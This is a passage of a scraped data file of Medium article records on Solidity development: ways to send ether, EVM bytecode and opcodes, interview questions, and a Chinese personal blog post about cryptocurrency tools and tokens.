{}. I hope my comments in the code is clear. To get the returned value of setA without ABI, we have to understand how memory works in the EVM. Free memory is available at the 64th Byte (0x40), so we first move our memory pointer there. Then, we append the hexadecimals of the function signature and its argument sequentially at that spot. The function signature is 4 Bytes (0x04) and the argument is 32 Bytes (0x20), so we have 36 Bytes in total (0x24).Once done, we do the magic \u201ccall\u201d which stores the result back in the 64th Byte spot and returns a boolean, ie 1 or 0. The transaction will revert if call fails (returns a 0). Assuming everything is successful, we return the value at the 64th Byte spot, which is the answer we want.Try the code in remix and see for yourself.Happy coding.", "responses": "9"}, {"title": "Three methods to send ether by means of\u00a0Solidity", "author_name": "Kirill Bulgakov", "link": "https://medium.com/daox/three-methods-to-transfer-funds-in-ethereum-by-means-of-solidity-5719944ed6e9?source=search_post", "post_date": "Feb 20, 2018", "readtime": "3 min read", "upvotes": "663", "content": "Three methods to send ether by means of\u00a0SolidityKirill BulgakovBlockedUnblockFollowFollowingFeb 20, 2018Solidity supports several methods of transferring ether between the contracts. This article takes a detailed look at three variants and the main differences between them. There will also be suggestions given as to the use of one or another method depending on a specific situation.1. address.send(amount)The first method which was introduced for transferring ether is send(). It has two details that should be considered.First and the most important characteristic is providing 2300 gas limit for execution the fallback function of a contract receiving ether. By the way, this quantity will be sufficient only to create one event.For instance, the code listed below works correctly:contract Sender {  function send(address _receiver) payable {    _receiver.send(msg.value);  }}contract Receiver {  uint public balance = 0;  event Receive(uint value);    function () payable {    Receive(msg.value);  }}The second important aspect that should be paid attention to is as follows: unsuccessful execution of send(), for example out of gas error returns false, but does not throw an exception. Hence, each usage of send() should be inside of require. Otherwise you will pay for gas to proceed a transaction submission in the blockchain, but all the state changes will be undone.For example, it only takes to change a bit the payable function in the Receiver contract:function () payable {  Receive(msg.value);  balance += msg.value;}and your transaction will have a successful receipt, however the status will not change, as an out of gas error has occurred:2. address.transfer(amount)Let us consider a method that appeared in the later versions of solidity. It has two details worth mentioning as well.First, this method has the same 2300 gas limit. However during the development process of these features the developers discussed an opportunity to add\u00a0.gas() modifier, which redefines the limit of the provided gas.Second, unlike send()method, transfer()throws exception when performed unsuccessfully. Thus, you get to know that your transaction is unsuccessful right at the execution attempt. Ethereum wallet or metamask will notify you about that:3. address.call.value(amount)( )The last and most customized method.The given function still returns false in case an error occurs, that is why keep the usage of require() in mind.Its principal difference from the two previous functions is an opportunity to set gas limit via\u00a0.gas(gasLimit) modifier. It is necessary in case the payable function of the contract receiving ether performs a complex logic, that requires plenty of gas.Let us take a look at the following example:contract Sender {  function send(address _receiver) payable {    _receiver.call.value(msg.value).gas(20317)();  }}contract Receiver {  uint public balance = 0;    function () payable {    balance += msg.value;  }}Execution of the payable function in the Receiver contract costs more than 20 thousand gas. That is why, usage of send() or transfer() would cause an out of gas error. However thanks to gas() modifier the above-mentioned example works correctly.Please notice that this method is not safe against reentrancy and impact on the contract could be worse than its potential flexibility. Check out this blogpost for more details.SummaryFinally, let me share a chart which might guide you when choosing a suitable function according to the assigned task.", "responses": "6"}, {"title": "Solidity Bytecode and Opcode\u00a0Basics", "author_name": "Bernard Peh", "link": "https://medium.com/@blockchain101/solidity-bytecode-and-opcode-basics-672e9b1a88c2?source=search_post", "post_date": "Sep 15, 2017", "readtime": "5 min read", "upvotes": "1K", "content": "Solidity Bytecode and Opcode\u00a0BasicsBernard PehBlockedUnblockFollowFollowingSep 15, 2017As we go deeper into writing smart contracts, we will come across terminologies like \u201cPUSH1\u201d, \u201cSSTORE\u201d, \u201cCALLVALUE\u201d\u00a0\u2026etc. What are they and should we even care about them?To know these commands, we have to go deeper into the Ethereum Virtual Machine (EVM). I was surprised there were very few resources on this subject when I googled around. Perhaps they were too technical? In this article, I\u2019ll try to explain some EVM basics as simple as I can.Like many other popular programming languages, Solidity is a high level programming language. We understand it but the machine doesn\u2019t. When we install an ethereum client such as geth, it also comes with the Ethereum Virtual Machine, a lightweight operating system that is specially created to run smart contracts.When we compile the solidity code using the solc compiler, it will translate our code into bytecode, something only the EVM can understand.Let us take a very simple contract for example:pragma solidity ^0.4.11;contract MyContract {    uint i = (10 + 2) * 2;}If we run this code in the remix browser and click on the contract details, we see lots of information.In this case, the compiled code is:60606040525b600080fd00a165627a7a7230582012c9bd00152fa1c480f6827f81515bb19c3e63bf7ed9ffbb5fda0265983ac7980029These long values are hexadecimal representation of the final contract, also known as bytecode. Under the \u201cWeb3 Deploy\u201d section of the remix browser, we see:...   {     from: web3.eth.accounts[0],      data: '0x606060405260186000553415601357600080fd5b5b60368060216000396000f30060606040525b600080fd00a165627a7a7230582012c9bd00152fa1c480f6827f81515bb19c3e63bf7ed9ffbb5fda0265983ac7980029',      gas: '4300000'   }, function (e, contract){    console.log(e, contract);    if (typeof contract.address !== 'undefined') {         console.log('Contract mined! address: ' + contract.address + ' transactionHash: ' + contract.transactionHash);    } })In simple terms, it means that when we deploy the contract, we simply deploy the hexadecimals under the data field with the recommended gas of 4300000.We have to start thinking hexadecimal if we want to talk to the EVM. Ever wonder why there is a \u201c0x\u201d in front of your wallet or transaction address? That\u2019s right, anything beginning with \u201c0x\u201d simply means the value is in hexadecimal format. Having \u201c0x\u201d in front of a hexadecimal is not compulsory because the EVM will treat any value as hexadecimal irregardless.We also see the operation code (aka opcode):PUSH1 0x60 PUSH1 0x40 MSTORE PUSH1 0x18 PUSH1 0x0 SSTORE CALLVALUE ISZERO PUSH1 0x13 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST JUMPDEST PUSH1 0x36 DUP1 PUSH1 0x21 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x60 PUSH1 0x40 MSTORE JUMPDEST PUSH1 0x0 DUP1 REVERT STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 SLT 0xc9 0xbd STOP ISZERO 0x2f LOG1 0xc4 DUP1 0xf6 DUP3 PUSH32 0x81515BB19C3E63BF7ED9FFBB5FDA0265983AC798002900000000000000000000Opcodes are the low level human readable instructions of the program. All opcodes have their hexadecimal counterparts, eg \u201cMSTORE\u201d is \u201c0x52\u201d, SSTORE\u201d is \u201c0x55\"\u00a0\u2026etc. Pyethereum github repo and the older Ethereum yellow paper have some good reference for all the solidity opcodes and their hexadecimal values.The EVM is also a Stack Machine. To explain simply, imagine stacking up slices of bread in a microwave, the LAST slice you put in is the FIRST one you take out. In computer science jargon, we call this LIFO.In normal arithmetic, we write our equation this way// Answer is 14. we do multiplication before addition.10 + 2 * 2In a stack machine, it works in LIFO principle2 2 * 10 + It means, put \u201c2\u201d in the stack first, followed by another \u201c2\u201d, then followed by multiplication action. The result is \u201c4\u201d sitting on top of the stack. now add a number \u201c10\u201d on top of \u201c4\u201d and eventually add the 2 numbers together. The final value of the stack becomes 14. This type of arithmetic is called Postfix Notation or Reverse Polish Notation.The act of putting data in the stack is called the \u201cPUSH\u201d instruction and the act of removing data from the stack is called the \u201cPOP\u201d instruction. Its obvious that the most common opcode we see in our example above is \u201cPUSH1\" which means putting 1 byte of data into the stack.So, this instruction:PUSH1 0x60means putting a 1 byte value of \u201c0x60\u201d in the stack. Coincidentally, the hexadecimal value for \u201cPUSH1\u201d happens to be \u201c0x60\u201d as well. Removing the non-compulsory \u201c0x\u201d, we could write this logic in bytecode as \u201c6060\".Let us go abit further.PUSH1 0x60 PUSH1 0x40 MSTORELooking at our favourite pyethereum opcode chart again, we see that MSTORE (0x52) takes in 2 inputs and produces no output. The opcodes above mean:PUSH1 (0x60): put 0x60 in the stack.PUSH1 (0x40): put 0x40 in the stack.MSTORE (0x52): allocate 0x60 of memory space and move to the 0x40 position.The resulting bytecode is:6060604052In fact, we always see this magic number \u201c6060604052\u201d in the beginning of any solidity bytecode because its how the smart contract bootstrap.To further complicate the matter, 0x40 or 0x60 cannot be interpreted as the real number 40 or 60. Since they are hexadecimal, 40 actually equates to 64 (16\u00b9 x 4) and 60 equates to 96 (16\u00b9 x 6) in decimal.In short, what \u201cPUSH1 0x60 PUSH1 0x40 MSTORE\u201d is doing is allocating 96 bytes of memory and moving the pointer to the beginning of the 64th byte. We now have 64 bytes for scratch space and 32 bytes for temporary memory storage.In the EVM, there are 3 places to store data. Firstly, in the stack. We\u2019ve just used the \u201cPUSH\u201d opcode to store data there as per the example above. Secondly in the memory (RAM) where we use the \u201cMSTORE\u201d opcode and lastly, in the disk storage where we use \u201cSSTORE\u201d to store the data. The gas required to store data to storage is the most expensive and storing data to stack is the cheapest.Assembly LanguageIt is also possible to write the whole smart contract using opcodes. That\u2019s where the Solidity Assembly Language comes in. It might be a lot harder to understand but could be useful if you want to save gas and do things that cannot be done by solidity.SummaryWe have only covered the basics of bytecode and a few opcodes. There are so many opcodes not yet discussed but you get the idea. Back the original question of whether we should even bother learning solidity opcodes\u200a\u2014\u200apossibly yes and no.We don\u2019t need to know opcodes to start writing smart contracts and it adds to the learning curve. On the other hand, the EVM error handling is still very primitive at the time of writing and its handy to look at opcodes when things go wrong. At the end of the day, there is no harm learning more.", "responses": "5"}, {"title": "The Ultimate Collection of Ethereum, Solidity and Smart Contracts Interview Questions", "author_name": "Alexander Vitanov", "link": "https://medium.com/@i6mi6/the-ultimate-collection-of-ethereum-solidity-and-smart-contracts-interview-questions-ef610d250012?source=search_post", "post_date": "Mar 7, 2018", "readtime": "11 min read", "upvotes": "696", "content": "Source: http://www.team2000-al.com/category/question-ideas/The Ultimate Collection of Ethereum, Solidity and Smart Contracts Interview QuestionsAlexander VitanovBlockedUnblockFollowFollowingMar 7, 2018Updated March 30You can use this collection of questions for interviews and as a cheatsheet to refresh your knowledge.Check back once in a while since I will keep updating this list.You can contribute here.Table of\u00a0ContentsEthereum client (Geth)Smart Contracts and SolidityDApps and web3Solidity", "responses": "7"}, {"title": "Solidity CRUD- Part\u00a02", "author_name": "Rob Hitchens", "link": "https://medium.com/robhitchens/solidity-crud-part-2-ed8d8b4f74ec?source=search_post", "post_date": "Feb 19, 2017", "readtime": "6 min read", "upvotes": "815", "content": "Solidity CRUD- Part\u00a02Rob HitchensBlockedUnblockFollowFollowingFeb 19, 2017Data Storage With Sequential Access, Random Access and DeleteUpdate 2019:The pattern described here is available as a Library now: https://medium.com/@robhitchens/solidity-crud-epilogue-e563e794fdeCode is available at https://bitbucket.org/rhitchens2/soliditycrud", "responses": "11"}, {"title": "\u5bf6\u535a\u58eb\u7684\u72d7\u5e74\u65b0\u6625\u5b78\u7fd2\u5c0f\u8a18\uff1a\u7051\u5e63\u3001Solidity\u3001\u5922\u904a\u4ed9\u5883\u3001AI \u73a9\u5177\u3001Futarchy\u3001\u96fb\u5b50\u516c\u6c11\u3001Brave \u700f\u89bd\u5668\u548c CryptoZombie", "author_name": "\u5bf6\u535a\u58eb\uff08dAb\uff09\u845b\u5982\u921e", "link": "https://medium.com/@daaab/%E5%AF%B6%E5%8D%9A%E5%A3%AB%E7%8B%97%E5%B9%B4%E6%96%B0%E6%98%A5%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98-6fdacca1c593?source=search_post", "post_date": "Feb 20, 2018", "readtime": "11 min read", "upvotes": "1K", "content": "\u5bf6\u535a\u58eb\u7684\u72d7\u5e74\u65b0\u6625\u5b78\u7fd2\u5c0f\u8a18\uff1a\u7051\u5e63\u3001Solidity\u3001\u5922\u904a\u4ed9\u5883\u3001AI \u73a9\u5177\u3001Futarchy\u3001\u96fb\u5b50\u516c\u6c11\u3001Brave \u700f\u89bd\u5668\u548c CryptoZombie\u5bf6\u535a\u58eb\uff08dAb\uff09\u845b\u5982\u921eBlockedUnblockFollowFollowingFeb 20, 2018\u9019\u6b21\u904e\u5e74\u5982\u679c\u6211\u6c92\u641e\u932f\u7684\u8a71\uff0c\u5927\u7d04\u662f\u5f9e\u60c5\u4eba\u7bc0\uff0c\u592a\u592a\u4e0a\u6d77\u6b78\u4f86\u958b\u59cb\u3002\u8b80\u4e86\u66f8\u3001\u807d\u4e86\u97f3\u6a02\u3001\u770b\u4e86\u96fb\u5f71\u3001\u505a\u4e86\u5b78\u7fd2\u3001\u5beb\u4e86\u7a0b\u5f0f\uff0c\u597d\u4e0d\u6109\u5feb\uff08\u9019\u7a2e\u6587\u6cd5\u6703\u4e0d\u6703\u5e74\u8f15\u4eba\u5df2\u7d93\u8b80\u4e0d\u61c2\uff1f\u597d\u4e0d\u6109\u5feb = \u597d\u6109\u5feb\uff01\uff09\u5e95\u4e0b\u7a0d\u5fae\u8a18\u9304\u4e00\u4e0b 2018 \u8fb2\u66c6\u65b0\u6625\u505a\u4e86\u54ea\u4e9b\u4e8b\uff1a\u7051\u4e86\u5169\u7a2e\u5e63\u5728\u4ee5\u592a\u5e63\u7db2\u8def\u4e0a\u767c\u4e86\u5bf6\u535a\u58eb\u5e63\uff08\u76ee\u524d\u6709 17 \u4eba\u6301\u5e63\uff09\uff1b2/15 \u5e6b DSB\u5927\u7051\u5e63\u5718\u968a\u767c\u4f48\u300c\u72d7\u5e74\u7051\u5e63\u8fce\u65b0\u6625\u300e\u5927\u5927\u7051\u5e63\uff0c\u5927\u5409\u5927\u5229\u300f\u4e03\u5929\u9650\u5b9a\u6d3b\u52d5\u300d\uff0c\u9806\u5229\u7051\u5e63 20 \u4eba\u6b21\uff1b2/16 \u767c\u5bf6\u535a\u58eb\u5e63\u7d66\u592a\u592a\uff1b2/17 \u5bf6\u535a\u58eb\u5e63\u7d05\u5305\u7051\u5e63\u6a5f http://BBSC.Rocks \u4e0a\u7dda\uff0c\u9806\u5229\u767c\u653e 20 \u5305\u5bf6\u5e63\u65b0\u6625\u7d05\u5305\uff0c\u76ee\u524d\u5bf6\u5e63/\u4fdd\u5e87\u6301\u6709\u4eba\u5305\u542b\uff1a\u5bf6\u592a\u592a\u3001\u77e5\u540d\u98df\u8b5c\u5e73\u53f0\u5275\u696d\u5bb6\u3001\u90e8\u9577\u7d1a\u9577\u8f29\u3001VR\u5167\u5bb9\u5275\u696d\u5bb6\u517c\u5275\u696d\u5708\u9ec3\u91d1\u55ae\u8eab\u6f22 \u7b49\u773e\u597d\u53cb\uff5e XD\u8b80\u4e86\u56db\u672c\u66f8\u300a\u611b\u9e97\u7d72\u5922\u904a\u4ed9\u5883\u300b150\u5e74\u5168\u65b0\u7ffb\u8b6f\u7d00\u5ff5\u7248MaiCoin \u52a0\u6301\u300a\u6bd4\u7279\u5e63\u6295\u8cc7\u5168\u66f8\u300bOreilly\u300a \u5340\u584a\u93c8\uff1a\u672a\u4f86\u7d93\u6fdf\u7684\u85cd\u5716\u300b\u99f1\u4ee5\u8ecd\u300a\u5321\u8d85\u4eba\u300b\uff08\u672a\u8b80\u5b8c\uff09\u5fc3\u5f97\u662f\uff1a\u611b\u9e97\u7d72\u5922\u904a\u4ed9\u5883\u679c\u7136\u662f\u50b3\u5947\uff0c\u6839\u672c\u5c31\u662f\u4f5c\u8005\u5728\u55e8\u7684\u6642\u5019\u5beb\u7684\u2026 \u8d85\u7121\u908f\u8f2f\uff0c\u6240\u4ee5\u597d\u770b\u3002\u6b50\u840a\u79ae\u90a3\u672c\u96d6\u7136\u662f 2015 \u5e74\u7684\u8001\u66f8\uff0c\u4f46\u662f\u9817\u7cbe\u91c7\uff0c\u4e0d\u6127\u662f\u62ff\u904e\u54f2\u5b78\u5b78\u4f4d\u7684\u4f5c\u8005\u5beb\u7684\uff0c\u5377\u672b\u4e00\u7ae0\u7adf\u7136\u5728\u8a0e\u8ad6 \u201c\u53cb\u5584\u7684 AI \u201d\u548c \u201c\u5b87\u5b99\u9593\u7684\u8cc7\u8a0a\u89e3\u6790\u5ea6\u201d\u3002\u4ee5\u53ca\uff0c\u99f1\u4ee5\u8ecd\u679c\u7136\u9084\u662f\u6bd4\u8f03\u9069\u5408\u6587\u9752\uff0c\u4f46\u6211\u9810\u795d\u4ed6\u6709\u6a5f\u6703\u7372\u5f97\u8afe\u8c9d\u723e\u6587\u5b78\u734e\u3002\u767c\u73fe\u4e00\u500b\u9817\u9177\u7684\u97f3\u6a02Tash Sultana: Tiny Desk Concert\u200a\u2014\u200aYouTube\u662f\u807d\u8aaa\u6700\u8fd1\u5f88\u6d41\u884c\u7684\u4e00\u4eba\u6a02\u5718\u5f62\u5f0f\u3002\u5f71\u7247\u662f\u7f8e\u570b\u5168\u570b\u516c\u5171\u5ee3\u64ad\u96fb\u53f0 NPR Music \u7684\u7bc0\u76ee\uff1aTiny Desk Concert\uff08\u5c0f\u5713\u684c\u6f14\u5531\u6703\uff09\uff0c\u9817\u9177\u3002\u73a9\u4e86\u4e00\u500b AI\u00a0\u73a9\u5177\u7528\u6df1\u5ea6\u5b78\u7fd2 AI \u505a\u7684\u5716\u7247\u7e2e\u653e\u670d\u52d9\uff1a https://letsenhance.io/\u5de6\u908a\u539f\u5716\u7528\u6df1\u5ea6\u5b78\u7fd2\u4eba\u5de5\u667a\u6167\u6f14\u7b97\u6cd5\u653e\u5927\u56db\u500d\u7684\u6548\u679c\uff08\u53f3\u908a\uff09\u7528\u8d77\u4f86\u9817\u50cf\u79d1\u5e7b\u96fb\u5f71\u88e1\uff0c\u6bcf\u6b21\u4e0d\u77e5\u9053\u70ba\u5565\uff0c\u4e00\u9ede\u7c73\u7c92\u5927\u5c0f\u7684\u756b\u9762\u90fd\u80fd Zoom, Zoom, Zoom in \u653e\u5927\u5230\u72af\u4eba\u81c9\u5b54\u4e00\u6e05\u4e8c\u695a\u3002\u5be6\u52d9\u4e16\u754c\u88e1\uff0c\u90a3\u6a23\u653e\u5927\u6839\u672c\u53ea\u6703\u5f97\u5230\u99ac\u8cfd\u514b\uff01But\uff0c\u53ea\u8981\u7528\u4e86\u9019\u500b Letsenhance \u5de5\u5177\uff0c\u5c31\u53ef\u4ee5\u8b93 AI \u5e6b\u4f60 \u201c\u731c\u201d \u9019\u500b\u5c0f\u5716\u7247\u653e\u5927\u4e4b\u5f8c\u7684\u539f\u59cb\u89e3\u6790\u5ea6\u8a72\u9577\u4ec0\u9ebc\u6a23\uff01\u9817\u795e\u5947\u5427\uff01\uff08\u53ea\u8981\u767b\u5165\u8a3b\u518a\u5c31\u53ef\u4ee5\u73a9\u4e94\u5f35\u514d\u8cbb\u3002\uff09\u767c\u73fe\u4e86\u4e00\u500b\u9a5a\u4eba\u4e8b\u5be6\u5e7c\u5152\u6a5f\u5668\u4eba\u6559\u6750 mBot \u8ddf Scratch \u90fd\u80fd\u73a9\u6a5f\u5668\u5b78\u7fd2\u4e86\uff01\uff08\u6709\u7a4d\u7a57\u570b\u5c0f\u7684\u8001\u5e2b\u5df2\u7d93\u5728\u6559\u5c0f\u5b78\u751f Machine Learning\uff01\u53f0\u7063\u6709\u6551\u4e86\uff5e\u5927\u5b78\u751f\u5011\u8981\u54ed\u54ed\u3002\uff09\u5b78\u4e86\u4e00\u500b\u65b0\u540d\u8a5e Futarchy\u8a72\u89c0\u9ede\u7531\u7d93\u6fdf\u5b78\u5bb6 Hanson, Robin \u5728 2000 \u5e74\u6642\u63d0\u51fa\uff0c\u662f\u4e00\u7a2e\u65b0\u7684\u6c11\u4e3b\u5236\u5ea6\uff0c\u63d0\u5021\u300c\u7528\u9078\u7968\u8868\u9054\u50f9\u503c\u89c0\uff0c\u7528\u9214\u7968\u4e0b\u6ce8\u4fe1\u5ff5\u3002\u300d\uff08\u201dVote Values, Bet Beliefs.\u201d\uff09\uff0c\u8a72\u89c0\u9ede\u5728 2014 \u5e74\u88ab\u4ee5\u592a\u5e63\u5275\u8fa6\u4eba Vitalik \u8b9a\u63da\u4e26\u5ba3\u793a\u5e0c\u671b\u7528\u4ee5\u592a\u574a\u6280\u8853\u4f86\u5b8c\u6210\u8a72\u9858\u666f\u3002\u76f8\u95dc\u8a0e\u8ad6\u53ef\u53c3\u8003\u80e1\u4e00\u5929\u7684\u9019\u7bc7\u6587\u7ae0\uff1a\u80e1\u4e00\u5929\u5c08\u6b04\uff1a\u6295\u6a5f\u3001\u907f\u96aa\u8207\u6c11\u4e3b\u9632\u7b28\u6a5f\u5236\uff0c\u76f8\u7576\u7cbe\u91c7\u3002Futarchy \u76ee\u524d\u5b8c\u5168\u6c92\u6709\u4e2d\u6587\u7ffb\u8b6f\uff0c\u6709\u4eba\u7ffb\u300c\u5bcc\u5854\u5947\u300d\uff0c\u6211\u5247\u8a8d\u70ba\u8b6f\u4f5c\u300c\u5bcc\u5854\u96c6\u300d\u66f4\u597d\uff0c\u6bd4\u8f03\u6709\u900f\u904e\u9322\u8ca1\u51dd\u805a\u5171\u8b58\u7684\u610f\u601d\u2026\u4e0d\u904e\u6211\u731c\u6700\u5f8c\u7684\u300c\u5947\u300d\u5b57\u662f\u8ddf\u96a8 \u5b89\u90a3\u5176\u4e3b\u7fa9\uff08Anarchy & Anarchism\uff09\u7ffb\u7684\uff0c\u82e5\u771f\u5982\u6b64\uff0c\u4e5f\u8a72\u662f\u300c\u5bcc\u5854\u5176\u300d\u624d\u5c0d\u3002\u5dee\u9ede\u8981\u8fa6\u611b\u6c99\u5c3c\u4e9e\u96fb\u5b50\u516c\u6c11\u9019\u500b\u6211\u60f3\u5f88\u591a\u4eba\u90fd\u807d\u904e\u4e86\u3002\u82b1 100 \u6b50\u5c31\u80fd\u52a0\u5165\u6b50\u76df\u8b8a\u6210\u6b50\u76df\u516c\u6c11\u3002\u96d6\u7136\u6c92\u6709\u5c45\u4f4f\u6b0a\u3001\u5e87\u8b77\u6b0a\uff0c\u4f46\u53ef\u4ee5\u7dda\u4e0a\u958b\u516c\u53f8\uff0c\u96f6\u7a05\u7387\uff01\u4e0d\u904e\u4e0a\u7db2\u67e5\u67e5\uff0c\u807d\u8aaa\u4e09\u6708\u53f0\u7063\u5c31\u6703\u8a2d\u8fa6\u4e8b\u8655\uff0c\u70ba\u4e86\u65b9\u4fbf\u9818\u8b49\uff0c\u6c7a\u5b9a\u518d\u7b49\u4e00\u7b49\u3002\u88dd\u4e86\u4e00\u500b\u5168\u65b0\u700f\u89bd\u5668 BraveBrave\u200a\u2014\u200a\u53f2\u4e0a\u7b2c\u4e00\u500b\u5167\u5efa\u4ee5\u592a\u5e63\u9322\u5305\uff0c\u800c\u4e14\u8d85\u795e\u901f\u3001\u8d85\u8f15\u91cf\u3001\u8d85\u64cb\u5ee3\u544a\u7684\u5168\u65b0\u700f\u89bd\u5668\u200a\u2014\u200a\u7531 Mozilla Project \u7684\u5171\u540c\u5275\u8fa6\u4eba\uff0c\u4e5f\u662fJavaScript \u4e4b\u7236 Brendan Eich \u5168\u529b\u6253\u9020\u3002\u7528\u8d77\u4f86\u611f\u60f3\u5f88\u4e0d\u932f\uff0c\u771f\u7684\u5f88\u5feb\u3002\u800c\u4e14\u76f4\u63a5\u5167\u5efa MetaMask \u8d85\u65b9\u4fbf\u3002\u6b64\u5916\uff0c\u5b83\u9084\u63a8\u51fa\u4e86\u81ea\u5df1\u7684\u8ca8\u5e63 BAT\uff0c\u53ef\u4ee5\u900f\u904e\u700f\u89bd\u8a18\u9304\u5c07\u9810\u5148\u5b58\u653e\u5728\u700f\u89bd\u5668\u88e1\u4e00\u5b9a\u6578\u91cf\u7684 BAT \u7b49\u6bd4\u4f8b\u8d08\u9001\u7d66\u4f60\u901b\u6700\u591a\u7684\u90a3\u4e9b\u7db2\u7ad9\u7576\u505a\u652f\u6301\u3002Brave \u7684\u81ea\u52d5\u8d0a\u52a9\u529f\u80fd\u5148\u524d\u66ff LUNA \u8a08\u756b\u7533\u8acb\u4e86 BRAVE \u7684\u806f\u540d\u4e0b\u8f09\u6d3b\u52d5\uff0c\u900f\u904e\u9019\u500b\u4e0b\u8f09 Brave\uff0cLUNA \u8a08\u756b\u5c31\u6703\u7372\u5f97 5 \u7f8e\u91d1\u7684\u88dc\u52a9\uff1aluna.camera/be-brave\u767c\u73fe\u5169\u500b\u597d\u7528\u5e63APP\u8ddf\u4e00\u500b\u8d85\u760b\u72c2\u670d\u52d9 UpholdTrust\u200a\u2014\u200aEthereum Wallet \u662f\u76ee\u524d\u64cd\u4f5c\u6700\u7c21\u4fbf\uff0c\u5167\u542b DApp Browser\uff08\u8b93\u6211\u51fa\u9580\u5728\u5916\u7528\u624b\u6a5f\u5373\u53ef\u8cb7\u8ce3\u52a0\u5bc6\u8c93\uff09\u800c\u4e14\u5b8c\u5168\u958b\u6e90\uff08GPL3\uff09\u7684\u4ee5\u592a\u5e63\u9322\u5305\uff1aStatus\u76ee\u524d\u9084\u5728 alpha \u968e\u6bb5\uff0c\u4f46\u4ecb\u9762\u6709\u9ede\u9177\u9177\u7684 https://status.im\u200a\u2014\u200a\u4e00\u7a2e\u900f\u904e\u804a\u5929\u4ecb\u9762\u4f86\u73a9\u8f49\u4ee5\u592a\u5e63\u7684 APP\u3002Uphold \u662f\u88dd\u4e86 Brave \u4e26\u4e14\u8a8d\u771f\u73a9\u8d77\u4f86\u4e4b\u5f8c\u624d\u767c\u73fe\u7684\u3002\u56e0\u70ba\u525b\u525b\u63d0\u5230\u7684\u7db2\u8def\u885d\u6d6a\u8d08\u5e63\u670d\u52d9\uff0c\u5c31\u662f Brave \u5167\u5efa\u900f\u904e Uphold \u4f86\u9032\u884c\u3002Uphold \u662f\u4e00\u500b\u7dda\u4e0a\u96fb\u5b50\u9322\u5305\uff0c\u652f\u63f4\u591a\u7a2e\u8ca8\u5e63\u4ecb\u9762\u5e25\u6c23\uff0c\u53ef\u4ee5\u8f15\u9b06\u5237\u5361\u8cb7\u5e63\uff0c\u4e5f\u53ef\u4ee5\u8f15\u9b06\u51fa\u552e\u8f49\u56de\u6cd5\u5e63\uff08\u9700\u6709\u7f8e\u570b\u7f8e\u91d1\u5e33\u6236\uff09\u3002\u91cd\u9ede\u662f\uff0c\u5b83\u64c1\u6709\u5b8c\u6574\u7684 API \u548c Login Connect\uff0c\u63d0\u4f9b\u5176\u4ed6\u5e73\u53f0\u4f5c\u6578\u4f4d\u8ca8\u5e63\u66f4\u9032\u968e\u7684 FinTech \u91d1\u878d\u670d\u52d9\u3002Uphold \u7684\u4ecb\u9762\uff0c\u6bcf\u5f35\u4e0d\u540c\u8ca8\u5e63\u7684\u5361\u7247\u9084\u80fd\u63db\u5c01\u9762Uphold \u5e33\u6236\u53ef\u4ee5\u7528\u4f86\u767b\u5165\u4e00\u500b\u53eb\u505a Heleum \u7684\u81ea\u52d5\u6295\u8cc7\u5e73\u53f0\uff0c\u662f\u500b\u4ecb\u9762\u53ef\u611b\uff0c\u4f46\u670d\u52d9\u8a6d\u7570\u7684\u5e73\u53f0\u3002\u4f60\u53ef\u4ee5\u628a\u5728 Uphold \u7684\u6cd5\u5e63\u6216\u6578\u4f4d\u8ca8\u5e63\u8cc7\u7522\u66ab\u6642\u8f49\u79fb\u5230 Heleum \uff0c\u800c Heleum \u6703\u66ff\u4f60\u81ea\u52d5\u64cd\u4f5c\u5c07\u8cc7\u91d1\u62ff\u53bb\u8cb7\u5e7e\u7a2e\u4e3b\u6d41\u7684\u865b\u64ec\u8ca8\u5e63\uff0c\u4e00\u6bb5\u6642\u9593\u7372\u5229\u4ee5\u5f8c\uff0c\u8ddf\u4f60\u4e94\u4e94\u5206\u5e33\u3002\uff08\u8a72\u4e0d\u6703\u9019\u5c31\u662f\u60e1\u540d\u662d\u5f70\u7684\u62c6\u5206\u76e4\u3001\u8cc7\u91d1\u76e4\uff1f@@\uff09\u5bf6\u535a\u58eb\u500b\u6027\u5167\u5411\u5c0f\u5fc3\uff0c\u5c0d\u9019\u7a2e\u4e82\u4e03\u516b\u7cdf\u7528\u9322\u7684\u5e73\u53f0\u4e00\u5411\u8b39\u614e\uff0c\u76ee\u524d\u53ea\u5148\u5c0f\u5c0f\u6e2c\u8a66\u4e86 50 \u7f8e\u91d1\uff0c\u9694\u5169\u4e09\u500b\u6708\u518d\u4f86\u8ddf\u5927\u5bb6\u5831\u544a\u5f8c\u679c\u3002\u751f\u4e86\u5e7e\u96bb\u65b0\u8c93\u6211\u7684\u8c93\u7c43\uff1a https://www.cryptokitties.co/profile/0x12a0e25e62c1dbd32e505446062b26aecb65f028\u52a0\u5bc6\u8c93\u76ee\u524d\u5df2\u7d93\u63a8\u51fa\u4e2d\u6587\u7248\uff0c\u53eb\u505a \u201c\u8b0e\u6200\u8c93\u201d\u3002\u7ffb\u8b6f\u5f97\u4e0d\u932f\u3002\u5927\u5bb6\u6709\u7a7a\u53ef\u4ee5\u73a9\u73a9\u3002\u767c\u73fe\u4e86\u4e00\u500b\u9999\u6e2f\u767c\u7684\u5e63 LikeCoin\u4ecb\u9762\u4f5c\u7684\u4e0d\u932f\uff0c\u76ee\u524d\u767b\u5165\u5c31\u9001 8 LikeCoin\uff0c\u5176\u958b\u767c\u76ee\u7684\u662f\u5e0c\u671b\u53ef\u4ee5\u4f5c\u70ba\u8d0a\u52a9\u5275\u4f5c\u8005\u5c08\u7528\u7684\u6578\u4f4d\u8ca8\u5e63\u548c\u5e73\u53f0\u3002\u7528\u8d77\u4f86\u883b\u9806\uff0c\u4f5c\u8005\u770b\u4f86\u4e5f\u5f88\u7528\u5fc3\uff08\u65b0\u5e74\u7d05\u5305\u888b\u5f88\u5e25\uff09\uff0c\u4e0d\u904e\u8207\u700f\u89bd\u5668\u5167\u5efa\u5167\u5bb9\u8d0a\u52a9\u5e63\uff08Brave & BAT\uff09\u6216 Medium or Facebook 